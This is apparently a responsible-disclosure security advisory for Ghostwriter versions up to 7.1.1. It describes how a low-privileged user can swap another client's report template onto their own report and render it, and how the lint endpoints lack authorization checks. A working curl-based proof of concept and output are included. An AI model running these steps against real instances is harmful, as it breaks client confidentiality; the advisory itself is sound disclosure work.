https://github.com/GhostManager/Ghostwriter

## Title: Authenticated user can assign and render another client's report template, disclosing cross-client template content

Affected Versions: <= 7.1.1 (confirmed on commit 625a26b)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

CWE: CWE-639 - Authorization Bypass Through User-Controlled Key

### Summary
Report templates in Ghostwriter can be scoped to a specific client so that one engagement team cannot see another client's proprietary template (letterhead, branding, boilerplate, methodology, and custom Jinja2 logic). A regular authenticated user who is assigned to only one project can assign any other client's client-scoped template to a report they own and then generate the report, receiving a document rendered from that foreign template. This discloses the content of a report template the user has no authorization to view. The fix in 7.1.1 (GHSA-hx63-6fvp-4rpv) closed the direct template download URL but did not close the template-swap and report-generation path, which reach the same data.

### Details
Report templates may be client-scoped. The intended access control is `ReportTemplate.user_can_view`, which denies non-privileged users access to a template belonging to a client they cannot view:

`ghostwriter/reporting/models.py`
```
447    def user_can_view(self, user) -> bool:
448        if not user.is_active:
449            return False
450        if user.is_privileged or self.client is None:
451            return True
452        return self.client.user_can_view(user)
```

The legitimate UI that lets a user pick a template for a report enforces this scope by restricting the form queryset to global templates and templates belonging to the report's own client:

`ghostwriter/reporting/views2/report.py`
```
323        form.fields["docx_template"].queryset = (
324            ReportTemplate.objects.filter(
325                doc_type__doc_type="docx",
326            )
327            .filter(Q(client=self.object.project.client) | Q(client__isnull=True))
...
333        form.fields["pptx_template"].queryset = (
334            ReportTemplate.objects.filter(
335                doc_type__doc_type="pptx",
336            )
337            .filter(Q(client=self.object.project.client) | Q(client__isnull=True))
```

The AJAX endpoint that actually changes a report's template, `ReportTemplateSwap`, bypasses that restriction. Its only authorization check is `report.user_can_edit` (the report the attacker owns); it then loads the template by the user-supplied primary key with no `user_can_view` check and no client-match check, and assigns it:

`ghostwriter/reporting/views.py`
```
275 class ReportTemplateSwap(RoleBasedAccessControlMixin, SingleObjectMixin, View):
...
280    def test_func(self):
281        return self.get_object().user_can_edit(self.request.user)
...
295                docx_template_id = int(docx_template_id)
...
302                if docx_template_id >= 0:
303                    docx_template_query = ReportTemplate.objects.get(pk=docx_template_id)
304                    report.docx_template = docx_template_query
305                if pptx_template_id >= 0:
306                    pptx_template_query = ReportTemplate.objects.get(pk=pptx_template_id)
307                    report.pptx_template = pptx_template_query
...
315                report.save()
```

`Report` has no `save()`/`clean()` override that re-validates the template's client against the report's project client, so the foreign template is persisted on the report.

The generation endpoint then renders whatever template is assigned, checking only that the user can view the report (not that the user can use the assigned template):

`ghostwriter/reporting/views2/report.py`
```
947 class GenerateReportDOCX(GenerateReportBase):
...
952    def test_func(self):
953        return self.object.user_can_view(self.request.user)
...
971        # Get the template for this report
972        if obj.docx_template:
973            report_template = obj.docx_template
...
1003            exporter = ExportReportDocx(obj, report_template=report_template, include_bloodhound=self.include_bloodhound)
1004            report_name = exporter.render_filename(...)
1005            docx = exporter.run()
...
1021        response = HttpResponse(
1022            docx.getvalue(), content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
1023        )
```

`GenerateReportPPTX` (line 1083) and `GenerateReportAll` (line 1157) behave the same way for the PPTX template.

By contrast, the correctly gated siblings show the intended pattern: `ReportTemplateDetailView` / template download (`ghostwriter/reporting/views2/report.py:816`) explicitly calls `obj.client.user_can_edit(self.request.user)` / `obj.user_can_view(...)`, and the GraphQL select permission for `reporting_reporttemplate` restricts the `user` role to `client_id IS NULL` or templates whose client the user is invited to / assigned a project under. The swap+generate path is the one place that reaches a template by raw id without that check.

Template primary keys are sequential Django auto integers and are trivially enumerable. The user already sees the ids of global templates in the normal UI, and `ReportTemplateSwap` even returns the foreign template's detail URL (`data["docx_url"]`) in some responses, so a valid id is easy to obtain.

Secondary (same class, lower impact): `ReportTemplateLint` (`ghostwriter/reporting/views.py:443`) and `UpdateTemplateLintResults` (`ghostwriter/reporting/views.py:69`) do not override `test_func`. The base `RoleBasedAccessControlMixin.test_func` only returns `self.request.user.is_active` (`ghostwriter/api/utils.py:480`), so any authenticated user can lint any template by id (a write that overwrites another client's stored `lint_result`) and read any template's lint results (the variable names and Jinja errors revealing the template's structure).

### PoC
Pre-conditions:
- A Ghostwriter instance with at least two clients. Client B has a client-scoped report template (a normal setup: each client gets its own branded template).
- A non-privileged user (role `user`) assigned to a project under client A only, with at least one report they can edit. The user has no invite or assignment to client B.

Steps (run as the regular user). Replace host, cookies, and ids as appropriate. `REPORT_PK` is the attacker's own report (1 below); `VICTIM_TEMPLATE_PK` is client B's docx template id (5 below). The following is a real, end-to-end run against a v7.1.1 instance where the regular user `alice` is assigned only to a project under client A, owns report 1 there, and has no access to client B. Server-side confirmation before the run: `alice.is_privileged == False`, `template.user_can_view(alice) == False`, `clientB.user_can_view(alice) == False`, `report.user_can_edit(alice) == True`.

1. Confirm the attacker cannot reach client B's template through the gated path (direct download). The view denies access and redirects to the dashboard with a permission error:
```
curl -ks -b alice.cookies "http://HOST/reporting/templates/download/5" -L -o dl.html
grep -oi "do not have permission" dl.html
# do not have permission
```

2. Assign client B's template to the attacker's own report via the swap endpoint (no per-template authorization):
```
CSRF=$(grep csrftoken alice.cookies | awk '{print $7}')
curl -ks -b alice.cookies -H "X-CSRFToken: $CSRF" -H "X-Requested-With: XMLHttpRequest" \
  -X POST "http://HOST/reporting/ajax/report/template/swap/1" \
  --data "docx_template=5&pptx_template=-1"
```
Response (HTTP 200):
```
{"result": "success", "message": "Template configuraton successfully updated.",
 "docx_lint_result": "warning",
 "docx_lint_message": "Selected Word template has warnings from linter. ...",
 "docx_url": "/reporting/templates/5", "warnings": []}
```
The response even returns the foreign template's detail URL (`/reporting/templates/5`).

3. Generate the DOCX for the attacker's own report. The returned document is rendered from client B's template:
```
curl -ks -b alice.cookies "http://HOST/reporting/reports/1/docx/" -o leaked.docx \
  -w "%{http_code} %{content_type} %{size_download}\n"
# 200 application/vnd.openxmlformats-officedocument.wordprocessingml.document 36951
```

4. The generated report contains client B's confidential template content verbatim:
```
python3 -c "import zipfile;x=zipfile.ZipFile('leaked.docx').read('word/document.xml').decode();\
print('SECRETCORP-CONFIDENTIAL-LETTERHEAD-XYZ123' in x);\
print('proprietary template belongs to Client B' in x)"
# True
# True
```
The document.xml of the report alice downloaded contains client B's secret marker, the confidential heading, and the proprietary boilerplate that alice has no authorization to view.

Secondary (lint endpoints, no authorization), readable/writable by any authenticated user for any template id. Same `alice` session and victim template id 5:
```
curl -ks -b alice.cookies -H "X-CSRFToken: $CSRF" -H "X-Requested-With: XMLHttpRequest" \
  -X POST "http://HOST/reporting/ajax/report/template/lint/5"
# HTTP 200: {"warnings": ["Template is missing a recommended style ...", ...],
#            "errors": [], "result": "warning", "message": "Template linter returned ..."}
# (this also overwrites client B's stored lint_result)

curl -ks -b alice.cookies "http://HOST/reporting/ajax/report/template/lint/results/5"
# HTTP 200: rendered "Linting Results" HTML for client B's template
```

### Impact
Any authenticated low-privileged user (role `user`) who is assigned to a single project can read the content of report templates that belong to other clients, defeating the client-scoping that separates engagement teams in a multi-client deployment. Report templates routinely contain a client's letterhead, logos, confidential boilerplate, methodology wording, and custom document logic, so this is a cross-client confidentiality breach. The same path also writes a foreign template id onto the attacker's report, and the unauthenticated-on-authorization lint endpoints additionally allow reading lint results and overwriting the stored lint status of any template by id. This is the same data exposed by GHSA-hx63-6fvp-4rpv, reached through a path that the 7.1.1 fix did not cover.

### Disclosure

 - 21 June 2026 - reported via email
 - 22 June 2026 - accepted by maintainer with thanks
 - 24 June 2026 - fixed as part of v7.1.2
 - 18 August 2026 - disclosed

<img width="831" height="768" alt="image" src="https://github.com/user-attachments/assets/c9c32310-da23-4677-bdeb-c8dc86848d1f" />

<img width="1087" height="148" alt="image" src="https://github.com/user-attachments/assets/e0779c47-8aff-400c-8fe8-a5f0022a705e" />


